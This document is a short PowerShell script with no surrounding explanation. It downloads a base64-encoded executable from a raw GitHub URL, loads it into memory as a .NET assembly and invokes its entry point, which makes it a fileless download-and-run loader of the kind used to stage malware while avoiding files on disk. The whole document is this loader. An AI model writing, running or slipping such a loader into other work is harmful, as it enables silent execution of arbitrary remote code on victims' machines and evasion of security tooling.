$url = " https://raw.githubusercontent.com/mohamedali43/ps1/main/test.exe"

$response = Invoke-WebRequest -Uri $url -UseBasicParsing
$exeBytes = $response.Content

$memoryStream = New-Object System.IO.MemoryStream(, [Convert]::FromBase64String($exeBytes))

$assembly = [System.Reflection.Assembly]::Load($memoryStream.ToArray())

$entryPoint = $assembly.EntryPoint

if ($entryPoint) {
    $entryPoint.Invoke($null, @([string[]]@()))
}
